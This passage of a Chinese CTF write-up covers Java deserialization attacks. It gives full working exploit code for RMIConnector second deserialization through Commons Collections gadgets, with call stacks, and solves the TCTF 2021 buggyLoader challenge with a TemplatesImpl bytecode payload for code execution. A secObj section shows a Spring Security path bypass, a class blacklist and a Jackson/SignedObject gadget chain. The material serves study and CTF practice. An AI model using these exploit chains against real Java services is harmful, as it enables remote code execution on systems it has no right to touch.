class="hljs-string">&quot;aa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aa&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryfield.set(lazyMap,chainedTransformer);<br><br><br><br><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> serialize2Base64(map2);<br>        run(s);<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ser)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser));<br>        objectInputStream.readObject();<br>        System.out.println(<span class="hljs-string">&quot;Unserialize Ok!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize2Base64</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(object);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(object);<br>        System.out.println(<span class="hljs-string">&quot;Serialize Ok!&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(s);<br>        System.out.println(s.length());<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String base64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+base64);<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">connect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,rmiConnector);<br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap1.put(tiedMapEntry, <span class="hljs-string">&quot;2&quot;</span>);<br>        lazyMap.remove(rmiConnector);<br>        setFieldValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>,connect);<br>        <span class="hljs-type">byte</span>[] serialize = serialize(hashMap1);<br>        unserialize(serialize);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125971.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>调用栈</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">findRMIServerJRMP:1993,</span> <span class="hljs-string">RMIConnector</span> <span class="hljs-string">(javax.management.remote.rmi)</span><br><span class="hljs-string">findRMIServer:1924,</span> <span class="hljs-string">RMIConnector</span> <span class="hljs-string">(javax.management.remote.rmi)</span><br><span class="hljs-string">connect:287,</span> <span class="hljs-string">RMIConnector</span> <span class="hljs-string">(javax.management.remote.rmi)</span><br><span class="hljs-string">connect:249,</span> <span class="hljs-string">RMIConnector</span> <span class="hljs-string">(javax.management.remote.rmi)</span><br><span class="hljs-string">invoke0:-1,</span> <span class="hljs-string">NativeMethodAccessorImpl</span> <span class="hljs-string">(sun.reflect)</span><br><span class="hljs-string">invoke:62,</span> <span class="hljs-string">NativeMethodAccessorImpl</span> <span class="hljs-string">(sun.reflect)</span><br><span class="hljs-string">invoke:43,</span> <span class="hljs-string">DelegatingMethodAccessorImpl</span> <span class="hljs-string">(sun.reflect)</span><br><span class="hljs-string">invoke:498,</span> <span class="hljs-string">Method</span> <span class="hljs-string">(java.lang.reflect)</span><br><span class="hljs-string">transform:125,</span> <span class="hljs-string">InvokerTransformer</span> <span class="hljs-string">(org.apache.commons.collections.functors)</span><br><span class="hljs-string">get:151,</span> <span class="hljs-string">LazyMap</span> <span class="hljs-string">(org.apache.commons.collections.map)</span><br><span class="hljs-string">getValue:73,</span> <span class="hljs-string">TiedMapEntry</span> <span class="hljs-string">(org.apache.commons.collections.keyvalue)</span><br><span class="hljs-string">hashCode:120,</span> <span class="hljs-string">TiedMapEntry</span> <span class="hljs-string">(org.apache.commons.collections.keyvalue)</span><br><span class="hljs-string">hash:339,</span> <span class="hljs-string">HashMap</span> <span class="hljs-string">(java.util)</span><br><span class="hljs-string">readObject:1413,</span> <span class="hljs-string">HashMap</span> <span class="hljs-string">(java.util)</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h1><p>‍</p>
+<h2 id="TCTF-2021-buggyLoader"><a href="#TCTF-2021-buggyLoader" class="headerlink" title="[TCTF 2021]buggyLoader"></a>[TCTF 2021]buggyLoader</h2><p><a target="_blank" rel="noopener" href="https://github.com/waderwu/javaDeserializeLabs">https://github.com/waderwu/javaDeserializeLabs</a></p>
+<p>‍</p>
+<h3 id="考点分析-1"><a href="#考点分析-1" class="headerlink" title="考点分析"></a>考点分析</h3><p>‍</p>
+<ol>
+<li>Java代码审计</li>
+<li>Java RMIConnector 二次反序列化</li>
+</ol>
+<p>‍</p>
+<p>对传进来的data参数进行了hex的处理，处理过后用自定义的<code>MyObjectInputStream</code>​来处理字节，然后满足属性直接反序列化</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125491.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>先来看看​<code>hexStringToBytes</code>​</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125644.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>就是个hex解码而已</p>
+<p>‍</p>
+<p>然后看自定义的<code>MyObjectInputStream</code>​ </p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125803.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>可以看到重写了resolveClass方法，使用了<code>URLClassLoader.loadClass()</code>​而非默认的<code>Class.forName()</code>​去加载类</p>
+<h3 id="关于ResolveClass"><a href="#关于ResolveClass" class="headerlink" title="关于ResolveClass"></a>关于ResolveClass</h3><p>在Java中，当使用<code>ObjectInputStream</code>​进行反序列化时，<code>resolveClass()</code>​方法会默认被调用，其作用就是对类进行验证和加载，具体来说，当反序列化一个对象时，如果该对象包含的类尚未被加载，那么<code>ObjectInputStream</code>​就会调用<code>resolveClass()</code>​方法来加载该类。resolveClass()方法的默认实现会使用当前线程的上下文<code>ClassLoader</code>​来加载类,即<code>Class.forName()</code>​</p>
+<p>另外，<code>resolveClass()</code>​方法还可以用于防止恶意攻击，比如通过序列化和反序列化来注入恶意代码或者执行非法操作。通过在​<code>resolveClass()</code>​方法中实现自定义的安全检查逻辑，做一些过滤处理，例如过滤一些危险类JNDI、RMI、TemplatesImpl等，可以有效地增强反序列化的安全性。</p>
+<p>‍</p>
+<h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>查看下依赖，可以发现存在CC的依赖，那么直接打CC就好了</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125964.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>但是<code>URLClassLoader.loadClass()</code>​跟默认的<code>Class.forName()</code>​有啥区别呢？</p>
+<p>区别在于<code>URLClassLoader.loadClass()</code>​不能够加载数组，举个例子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        System.out.println(Class.forName(<span class="hljs-string">&quot;[[B&quot;</span>));  <span class="hljs-comment">// class [[B</span><br>        System.out.println(URLClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;[[B&quot;</span>));  <span class="hljs-comment">// ClassNotFoundException</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125117.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么既然是因为这个，所以我们的数组的payload就无法使用了，因为在打CC的过程当中基本都会带上<code>ChainedTransformer</code>​来链式调用，或者在最后的Sink的点的时候会用到<code>TemplatesImpl</code>​来加载<code>byte[][]</code>​字节码，但是这里就都没办法使用了，当然了不使用<code>ChainedTransformer</code>​链式调用一个一个手动来触发也是可以的，但是因为存在<code>RMIConnector</code>​进行二次反序列化会更加方便，因为我们可以只需要单<code>InvokerTransformer</code>​来进行反射调用<code>connect()</code>​方法即可，那么写出EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">buggyLoader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldname,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//cc6的HashMap链</span><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;payloads&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, obj);<br><br><br>        HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;test&quot;</span>);<br>        lazyMap.remove(obj);<br><br>        setFieldValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, transformer);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesTohexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123;<br>        <span class="hljs-comment">//题目要求16进制</span><br>        <span class="hljs-keyword">if</span> (bytes == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-number">2</span> * bytes.length);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bytes.length; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0xF</span> &amp; bytes[i] &gt;&gt; <span class="hljs-number">4</span>;<br>            ret.append(<span class="hljs-string">&quot;0123456789abcdef&quot;</span>.charAt(b));<br>            b = <span class="hljs-number">0xF</span> &amp; bytes[i];<br>            ret.append(<span class="hljs-string">&quot;0123456789abcdef&quot;</span>.charAt(b));<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//获取exp的base64编码</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">tser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">toser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(tser);<br>        toser.writeObject(getObject());<br>        toser.close();<br><br>        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());<br><br>        <span class="hljs-comment">//创建恶意的RMIConnector</span><br>        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+exp);<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//使用InvokerTransformer 调用 connect 方法</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, rmiConnector);<br><br>        HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;test&quot;</span>);<br>        lazyMap.remove(rmiConnector);<br><br>        setFieldValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, invokerTransformer);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeUTF(<span class="hljs-string">&quot;SJTU&quot;</span>);<br>        oos.writeInt(<span class="hljs-number">1896</span>);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        System.out.println(bytesTohexString(baos.toByteArray()));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>在序列化的时候加入他的属性即可成功RCE</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125290.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="2023浙江省赛-secObj"><a href="#2023浙江省赛-secObj" class="headerlink" title="2023浙江省赛 secObj"></a>2023浙江省赛 secObj</h2><p>‍</p>
+<p>考点：</p>
+<ol>
+<li>Spring Security 权限绕过(设计缺陷)</li>
+<li>Java代码审计</li>
+<li>‍</li>
+</ol>
+<p>‍</p>
+<p>给了jar，看目录结构如下</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125463.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h3 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h3><p>‍</p>
+<p>配置文件是端口，发现存在SecurityConfig先看这个</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125604.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现使用的<code>antMatcher</code>​的匹配方式并且后面并不是<code>/**</code>​直接随便绕过</p>
+<p>因为在<code>antMatcher</code>​中  <code>/admin/*</code>​实际上只匹配一层资源，也就是只能匹配到<code>admin.do</code>​这样或者直接路由为<code>/admin</code>​这样</p>
+<p>‍</p>
+<p>但是很神奇的事情发生了，<code>admin</code>​仅仅是根路由，并不是直接映射的(我感觉是出题人设计缺陷吧)</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125763.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>直接访问<code>/admin/user/hello</code>​即可</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125952.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h3 id="审计分析"><a href="#审计分析" class="headerlink" title="审计分析"></a>审计分析</h3><p>其实有代码的就这个路由，传入一个data，使用自定义的反序列化写法进行反序列化</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125108.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>跟进下<code>MyObjectInputStream</code>​，一样是重写了​<code>resolveClass</code>​</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125336.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>禁用了这些关键字</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blackList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;AbstractTranslet&quot;</span>, <span class="hljs-string">&quot;Templates&quot;</span>, <span class="hljs-string">&quot;TemplatesImpl&quot;</span>, <span class="hljs-string">&quot;javax.management&quot;</span>, <span class="hljs-string">&quot;swing&quot;</span>, <span class="hljs-string">&quot;awt&quot;</span>, <span class="hljs-string">&quot;fastjson&quot;</span>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>那么接下来就是来看怎么打反序列化了，存在以上黑名单而且发现只有一个jackson依赖可以利用，JDK自带的<code>TemplatesImpl</code>​也被过滤了，所以想到二次反序列化，那么问题就变成如何触发getter了</p>
+<p>‍</p>
+<h3 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h3><p>上面也讲到存在jackson关键依赖，所以我们就可以用jackson中的<code>POJONode</code>​来调用getter方法来触发SignedObject的二次反序列化</p>
+<p>‍</p>
+<p>但是这里遇到一个问题，二次打什么链呢？这里其实就是归结于如何调用getter的方法了，而这里的环境都是自带的jdk+spring，所以说多也不算多说少也不算少的方法，以下就写出方式的调用链(其实就是 1 2 3 排列组合为113 223 123这样子)，就写出一种EXP</p>
+<p>‍</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap#readObject() -&gt; HashMap#putVal() -&gt; HotSwappableTargetSource#equals() -&gt; XString#equals() -&gt; ToStringBean#toString() -&gt;POJONode#toString() -&gt; SignedObject#getObject() -&gt; BadAttributeValueExpException#readObject() -&gt; BaseJsonNode#toString() -&gt; TemplatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
